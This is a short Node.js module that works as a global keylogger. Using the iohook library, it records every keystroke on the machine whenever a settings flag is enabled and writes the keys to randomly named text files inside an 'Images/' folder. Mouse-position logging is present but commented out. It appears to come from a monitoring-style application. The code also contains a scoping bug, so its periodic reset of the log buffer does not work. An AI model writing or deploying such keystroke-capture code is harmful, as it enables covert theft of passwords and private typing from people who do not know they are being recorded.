module.exports = function(KeyIsEnable) {
  var keycode = require('keycode');
  let shared=require("./Shared.js");
var fs = require('fs'); 
const ioHook = require('iohook');
var FileNameKey="Images/"+"Keyboard-"+shared.getRandomInt(9999999999)+".txt";
// var FileNameMouse="Images/"+"mouse-"+getRandomInt(9999999999)+".txt";
let response= shared.readSetting();
let text_key="";
// let text_mouse="";
let main_key="";
// let main_mouse="";
setInterval(function(){
  response= shared.readSetting();
  FileNameKey="Images/"+"Keyboard-"+shared.getRandomInt(9999999999)+".txt";
// var FileNameMouse="Images/"+"mouse-"+getRandomInt(9999999999)+".txt";
let text_key="";
// let text_mouse="";
let main_key="";
// let main_mouse="";
},response.Keyboard)
  
ioHook.on('keydown', function(e)
{

 if(response.KeyboardEnable==true)
 {
  
    console.log(e.rawcode);
     text_key=keycode(e.rawcode)//String.fromCharCode(e.rawcode);
     if(text_key!=undefined)
     {
      main_key+=text_key+",";
      fs.writeFileSync(FileNameKey,main_key); 
     }
 
    
 }
  
});
// ioHook.on('mousemove', function(e)
// {

//  if(mouseIsEnable==true)
//  {
//      text_mouse=e.x+","+e.y;

//   main_mouse+=text_mouse;
//   fs.writeFileSync(FileNameMouse,main_mouse); 
//  }

// });
ioHook.start();

ioHook.start(true);
}